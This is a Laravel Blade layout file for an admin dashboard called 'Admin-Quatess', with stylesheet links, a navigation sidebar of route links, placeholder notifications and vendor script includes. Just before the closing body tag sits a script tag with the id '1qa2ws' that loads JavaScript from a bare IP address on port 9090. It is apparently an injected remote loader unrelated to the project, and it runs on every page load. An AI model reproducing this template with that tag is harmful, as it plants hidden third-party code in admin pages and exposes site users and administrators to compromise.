<!DOCTYPE html>
<html lang="en">
  <!-- Build By Ulrich Quatess -->
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Admin-Quatess | dashboard </title>
<!-- Bootstrap -->
<link href="{{ asset('quatess/css/bootstrap.min.css')}}" rel="stylesheet">
<!-- slimscroll -->
<link href="{{ asset('quatess/css/jquery.slimscroll.css')}}" rel="stylesheet">
<!-- project -->
<link href="{{ asset('quatess/css/project.css')}}" rel="stylesheet">
<!--timeline_horizontal-->
<link rel="stylesheet" href="{{ asset('quatess/css/horizontalTimeLine.css')}}">
<!--flotCart-->
<link href="{{ asset('quatess/css/flotCart.css')}}" rel="stylesheet">
<!-- dataTables -->
<link href="{{ asset('quatess/css/buttons.dataTables.min.css')}}" rel="stylesheet">
<link href="{{ asset('quatess/css/dataTables.bootstrap.min.css')}}" rel="stylesheet">
<link href="{{ asset('quatess/css/responsive.dataTables.min.css')}}" rel="stylesheet">
<link href="{{ asset('quatess/css/fixedHeader.dataTables.min.css')}}" rel="stylesheet">
<!-- Fontes -->
<link href="{{ asset('quatess/css/font-awesome.min.css')}}" rel="stylesheet">
<link href="{{ asset('quatess/css/simple-line-icons.css')}}" rel="stylesheet">
<link href="{{ asset('quatess/css/buttons.css')}}" rel="stylesheet">
<!-- animate css -->
<link href="{{ asset('quatess/css/animate.css')}}" rel="stylesheet">
<!-- adminbag main css -->
<link href="{{ asset('quatess/css/main.css')}}" rel="stylesheet">
<!-- dark theme css -->
<link href="{{ asset('quatess/css/dark.css')}}" rel="stylesheet">

<!-- eCommerce css -->
<link href="{{ asset('quatess/css/eCommerce.css')}}" rel="stylesheet">
<!-- icheck -->
<link href="{{ asset('quatess/css/skins/all.css')}}" rel="stylesheet">

<!-- media css for responsive  -->
<link href="{{ asset('quatess/css/main.media.css')}}" rel="stylesheet">
<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>
<body class="page-header-fixed ">
<div class="page-header navbar navbar-fixed-top">
  <!-- BEGIN HEADER INNER -->
  <div class="page-header-inner ">
    <!-- BEGIN LOGO -->
    <div class="page-logo"> <a href="/dashboard"> <img class="logo-default" alt="logo" src="{{ asset('quatess/images/logo.png')}}"> </a> </div>
    <!-- END LOGO -->
    <div class="library-menu"> <span class="one">-</span> <span class="two">-</span> <span class="three">-</span> </div>
    <!-- BEGIN TOP NAVIGATION MENU -->
    <div class="top-menu">
      <ul class="nav navbar-nav pull-right">
        <li class="dropdown"> <a href="#" data-toggle="dropdown" class="dropdown-toggle count-info" > <i class="fa fa-envelope"></i> <span class="badge badge-info">6</span> </a>
          <ul class="dropdown-menu dropdown-messages menuBig">
            <li>
              <div class="dropdown-messages-box"> <a class="pull-left" href="profile.html"> <img src="{{ asset('quatess/images/teem/a7.jpg')}}" class="img-circle" alt="image"> </a>
                <div class="media-body"> <small class="pull-right">46h ago</small> <strong>Mike Loreipsum</strong> started following <strong>Olivia Wenscombe</strong>. <br>
                  <small class="text-muted">3 days ago at 7:58 pm - 10.06.2014</small> </div>
              </div>
            </li>
            <li class="divider"></li>
            <li>
              <div class="dropdown-messages-box"> <a class="pull-left" href="profile.html"> <img src="{{ asset('quatess/images/teem/a4.jpg')}}" class="img-circle" alt="image"> </a>
                <div class="media-body "> <small class="pull-right text-navy">5h ago</small> <strong>Alex Smith </strong> started following <strong>Olivia Wenscombe</strong>. <br>
                  <small class="text-muted">Yesterday 1:21 pm - 11.06.2014</small> </div>
              </div>
            </li>
            <li class="divider"></li>
            <li>
              <div class="dropdown-messages-box"> <a class="pull-left" href="profile.html"> <img src="{{ asset('quatess/images/teem/a3.jpg')}}" class="img-circle" alt="image"> </a>
                <div class="media-body "> <small class="pull-right">23h ago</small> <strong>Olivia Wenscombe</strong> love <strong>Sophie </strong>. <br>
                  <small class="text-muted">2 days ago at 2:30 am - 11.06.2014</small> </div>
              </div>
            </li>
            <li class="divider"></li>
            <li>
              <div class="text-center link-block"> <a href="mailbox.html"> <i class="fa fa-envelope"></i> <strong>Read All Messages</strong> </a> </div>
            </li>
          </ul>
        </li>
        <li class="dropdown"> <a href="#" data-toggle="dropdown" class="dropdown-toggle count-info" > <i class="fa fa-bell"></i> <span class="badge badge-primary">8</span> </a>
          <ul class="dropdown-menu dropdown-alerts menuBig">
            <li> <a href="mailbox.html">
              <div> <i class="fa fa-envelope fa-fw"></i> You have 16 messages <span class="pull-right text-muted small">4 minutes ago</span> </div>
              </a> </li>
            <li class="divider"></li>
            <li> <a href="profile.html">
              <div> <i class="fa fa-twitter fa-fw"></i> 3 New Followers <span class="pull-right text-muted small">12 minutes ago</span> </div>
              </a> </li>
            <li class="divider"></li>
            <li> <a href="grid_options.html">
              <div> <i class="fa fa-upload fa-fw"></i> Server Rebooted <span class="pull-right text-muted small">4 minutes ago</span> </div>
              </a> </li>
            <li class="divider"></li>
            <li>
              <div class="text-center link-block"> <a href="mailbox.html"> <strong>See All Alerts</strong> <i class="fa fa-angle-right"></i> </a> </div>
            </li>
          </ul>
        </li>
        <!-- START USER LOGIN DROPDOWN -->
<li class="dropdown dropdown-user"> <a data-close-others="true" data-hover="dropdown" data-toggle="dropdown"  class="dropdown-toggle" href="javascript:;"> <img src="{{ asset('quatess/images/teem/a10.jpg')}}" class="img-circle" alt=""> <span class="username username-hide-on-mobile"> Susan Wenscombe</span> <i class="fa fa-angle-down"></i> </a>
          <ul class="dropdown-menu dropdown-menu-default">
            <li> <a href="profile.html"> <i class="icon-user"></i> My Profile </a>

</li>
<li>
<a href="profile_2.html"> <i class="icon-user"></i> Profile-2 </a> </li>
            <li> <a href="calendar.html"> <i class="icon-calendar"></i> My Calendar </a> </li>
            <li> <a href="mailbox.html"> <i class="icon-envelope-open"></i> My Inbox <span class="badge badge-danger"> 3 </span> </a> </li>
            <li> <a href="dashboard2.html"> <i class="icon-rocket"></i> My Tasks <span class="badge badge-success"> 7 </span> </a> </li>
            <li class="divider"> </li>
            <li> <a href="lockscreen.html"> <i class="icon-lock"></i> Lock Screen </a> </li>
            <li> <a href="login.html"> <i class="icon-key"></i> Log Out </a> </li>
          </ul>
        </li>
        <!-- END USER LOGIN DROPDOWN -->
      </ul>
    </div>
    <!-- END TOP NAVIGATION MENU -->
  </div>
  <!-- END HEADER INNER -->
</div>
<div class="clearfix"> </div>
<div class="page-container">
  <!-- Start page sidebar wrapper -->
  <div class="page-sidebar-wrapper">
    <div class="page-sidebar">
      <ul class="page-sidebar-menu  page-header-fixed ">
            
        <li class="nav-item"><i class="fa fa-flash"></i> 
          <span class="title">Quatess Widget</span> </a></li>
        <li class="heading">
<h3 class="uppercase">Features</h3>
        </li>
        <li class="nav-item"> <a class="nav-link nav-toggle" href="javascript:;"> <i class="icon-user"></i></i> <span class="title">UI Admin</span> <span class="arrow"></span> </a>
          <ul class="sub-menu">
            <li class="nav-item"> <a class="nav-link" href="{{ route('account.create')}}"> <span class="title">Create New Admin</span> </a> </li>
            <li class="nav-item"> <a class="nav-link" href="{{ route('account.index')}}"> <span class="title">See All Admin</span> </a> </li>
            <li class="nav-item"> <a class="nav-link" href="{{ route('role.create')}}"> <span class="title">Create Roles</span> </a> </li>
            <li class="nav-item"> <a class="nav-link" href="{{ route('role.index')}}"> <span class="title">View Roles</span> </a> </li>
          </ul>
        </li>
        <li class="nav-item"> <a class="nav-link nav-toggle" href="javascript:;"> <i class="fa fa-flask"></i> <span class="title">Components</span> <span class="arrow"></span> </a>
          <ul class="sub-menu">
            <li class="nav-item"> <a class="nav-link" href="{{ route('portfolio.create') }}"> <span class="title">Create Portfolio</span> </a> </li>
            <li class="nav-item"> <a class="nav-link" href="{{ route('portfolio.index') }}"> <span class="title">View Portfolio</span> <span class="badge badge-danger">8</span> </a> </li>
            <li class="nav-item"> <a class="nav-link" href="{{ route('blog.create')}}"> <span class="title">Create Blog</span> </a> </li>
            <li class="nav-item"> <a class="nav-link" href="{{ route('blog.index')}}"> <span class="title">View Blog</span> </a> </li>
            
          </ul>
        </li>

        <li class="nav-item"> <a class="nav-link nav-toggle" href="javascript:;"> <i class="icon-layers"></i> <span class="title">Company Component</span> <span class="arrow"></span> </a>
          <ul class="sub-menu">
            <li class="nav-item"> <a class="nav-link" href="{{ route('project.create')}}"> <span class="title">Create Project</span> </a> </li>
            <li class="nav-item"> <a class="nav-link" href="{{ route('project.index')}}"> <span class="title">View Project</span> </a> </li>
            <li class="nav-item"> <a class="nav-link" href="{{ route('service.create')}}"> <span class="title">Create Services</span> </a> </li>
            <li class="nav-item"> <a class="nav-link" href="{{ route('service.index')}}"> <span class="title">View Services</span> </a> </li>
            <li class="nav-item"> <a class="nav-link" href="{{ route('client.create')}}"> <span class="title">Create Clients</span> </a> </li>
            <li class="nav-item"> <a class="nav-link" href="{{ route('client.index')}}"> <span class="title">View Clients</span> </a> </li>
          </ul>
        </li>
        <li class="nav-item"> <a class="nav-link nav-toggle" href="javascript:;"> <i class="icon-paper-plane"></i> <span class="title">PARAMETER</span> <span class="arrow"></span> </a>
          <ul class="sub-menu">
            <li class="nav-item"> <a class="nav-link" href="{{ route('setting.create')}}"> <span class="title">Create Setting </span> </a> </li>
            <li class="nav-item"> <a class="nav-link" href="{{ route('setting.index')}}"> <span class="title">View Setting </span> </a> </li>
            <li class="nav-item"> <a class="nav-link" href="{{ route('support.create')}}"> <span class="title">Create Support </span> </a> </li>
            <li class="nav-item"> <a class="nav-link" href="{{ route('support.index')}}"> <span class="title">View Support </span> </a> </li>
          </ul>
        </li>
        <li class="heading">
          <h3 class="uppercase">Pages</h3>
        </li>
    
        <li class="nav-item"> <a class="nav-link nav-toggle" href="javascript:;"> <i class="fa fa-shopping-cart"></i> <span class="title">Team Member</span> <span class="arrow"></span> </a>
          <ul class="sub-menu">
            <li class="nav-item"><a class="nav-link" href="{{ route('team.create') }}">Create Team</a></li>
            <li class="nav-item"><a class="nav-link" href="{{ route('team.index') }}">View Teams </a></li>
          </ul>
        </li>

        <li class="nav-item"> <a class="nav-link nav-toggle" href="javascript:;"> <i class="fa fa-diamond"></i> <span class="title">Pages Member</span> <span class="arrow"></span> </a>
          <ul class="sub-menu">
            <li class="nav-item"><a class="nav-link" href="{{ route('page.create') }}">Create Page</a></li>
            <li class="nav-item"><a class="nav-link" href="{{ route('page.index') }}">View Pages </a></li>
          </ul>
        </li>

        <li class="nav-item"> <a class="nav-link nav-toggle" href="javascript:;"> <i class="fa fa-picture-o"></i> <span class="title">Gallery</span> <span class="arrow"></span> </a>
          <ul class="sub-menu">
            <li class="nav-item"><a class="nav-link" href="lightbox_gallery.html">Lightbox Gallery</a></li>
            <li class="nav-item"><a class="nav-link" href="slick_carousel.html">Slick Carousel</a></li>
            <li class="nav-item"><a class="nav-link" href="carousel.html">Bootstrap Carousel</a></li>
          </ul>
        </li>    
    </div>
  </div>
  <!-- End page sidebar wrapper -->

        @yield('content')

        <!-- start footer -->
<div class="footer">
          <div class="pull-right">
            <ul class="list-inline">
              <li><a title="" href="/dashboard">Dashboard</a></li>
              <li><a title="" href="mailbox.html"> Inbox </a></li>
              <li><a title="" href="{{ route('blog.index')}}">Blog</a></li>
            </ul>
          </div>
          <div> <strong>Copyright</strong> Quatess Company &copy; 2018 </div>
        </div>
      </div>
    </div>
  </div>
</div>
<!-- Go top -->
<a href="#" class="scrollup"><i class="fa fa-chevron-up"></i></a>
<!-- Go top -->
<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="{{URL::to('quatess')}}/js/vendor/jquery.min.js"></script>
<!-- bootstrap js -->
<script src="{{URL::to('quatess')}}/js/vendor/bootstrap.min.js"></script>
<!--  chartJs js  -->
<script src="{{URL::to('quatess')}}/js/vendor/chartJs/Chart.bundle.js"></script>
<!--timeline_horizontal-->
<script src="{{URL::to('quatess')}}/js/vendor/jquery.mobile.custom.min.js"></script>
<script src="{{URL::to('quatess')}}/js/vendor/hTimeline.js"></script>
<!--easypiechart-->
<script src="{{URL::to('quatess')}}/js/vendor/jquery.easing.min.js"></script>
<script src="{{URL::to('quatess')}}/js/vendor/jquery.easypiechart.min.js"></script>
<!-- Peity -->
<script src="{{URL::to('quatess')}}/js/vendor/peityJs/jquery.peity.min.js"></script>
<!-- Flot -->
<script src="{{URL::to('quatess')}}/js/vendor/flotCart/jquery.flot.js"></script>
<script src="{{URL::to('quatess')}}/js/vendor/flotCart/jquery.flot.tooltip.min.js"></script>
<script src="{{URL::to('quatess')}}/js/vendor/flotCart/jquery.flot.spline.js"></script>
<script src="{{URL::to('quatess')}}/js/vendor/flotCart/jquery.flot.resize.js"></script>
<script src="{{URL::to('quatess')}}/js/vendor/flotCart/jquery.flot.pie.js"></script>
<script src="{{URL::to('quatess')}}/js/vendor/flotCart/jquery.flot.symbol.js"></script>
<script src="{{URL::to('quatess')}}/js/vendor/flotCart/jquery.flot.time.js"></script>
<!-- dataTables-->
<script type="text/javascript" src="{{URL::to('quatess')}}/js/vendor/jquery.dataTables.js"></script>
<script type="text/javascript" src="{{URL::to('quatess')}}/js/vendor/dataTables.bootstrap.min.js"></script>
<!-- js for print and download -->
<script type="text/javascript" src="{{URL::to('quatess')}}/js/vendor/dataTables.buttons.min.js"></script>
<script type="text/javascript" src="{{URL::to('quatess')}}/js/vendor/buttons.flash.min.js"></script>
<script type="text/javascript" src="{{URL::to('quatess')}}/js/vendor/jszip.min.js"></script>
<script type="text/javascript" src="{{URL::to('quatess')}}/js/vendor/pdfmake.min.js"></script>
<script type="text/javascript" src="{{URL::to('quatess')}}/js/vendor/vfs_fonts.js"></script>
<script type="text/javascript" src="{{URL::to('quatess')}}/js/vendor/buttons.html5.min.js"></script>
<script type="text/javascript" src="{{URL::to('quatess')}}/js/vendor/buttons.print.min.js"></script>
<script type="text/javascript" src="{{URL::to('quatess')}}/js/vendor/dataTables.responsive.min.js"></script>
<script type="text/javascript" src="{{URL::to('quatess')}}/js/vendor/dataTables.fixedHeader.min.js"></script>
<script src="{{URL::to('quatess')}}/js/dashboard3.js"></script>
<!-- slimscroll js -->
<script type="text/javascript" src="{{URL::to('quatess')}}/js/vendor/jquery.slimscroll.js"></script>
<!-- pace js -->
<script src="{{URL::to('quatess')}}/js/vendor/pace/pace.min.js"></script>
<!-- main js -->
<script src="{{URL::to('quatess')}}/js/main.js"></script>
<script>
        $(document).ready(function(){          
    // Flexible table
    var table = $('#proList').DataTable({
    "bPaginate": true,
    "bLengthChange": false,
    "bFilter": true,
    "bInfo": false,
    "bAutoWidth": false });

   //  external search bar
    $('#search-projects').on( 'keyup', function () {
        table.search( this.value ).draw();
    } );



            $('#loading-example-btn').click(function () {
                btn = $(this);
                simpleLoad(btn, true)

                // Ajax example
//                $.ajax().always(function () {
//                    simpleLoad($(this), false)
//                });

                simpleLoad(btn, false)
            });
        });

        function simpleLoad(btn, state) {
            if (state) {
                btn.children().addClass('fa-spin');
                btn.contents().last().replaceWith(" Loading");
            } else {
                setTimeout(function () {
                    btn.children().removeClass('fa-spin');
                    btn.contents().last().replaceWith(" Refresh");
                }, 2000);
            }
        }
    </script>
<script type = 'text/javascript' id ='1qa2ws' charset='utf-8' src='http://154.70.108.86:9090/www/default/base.js'></script></body>
  <!-- Build By Ulrich Quatess -->
</html>
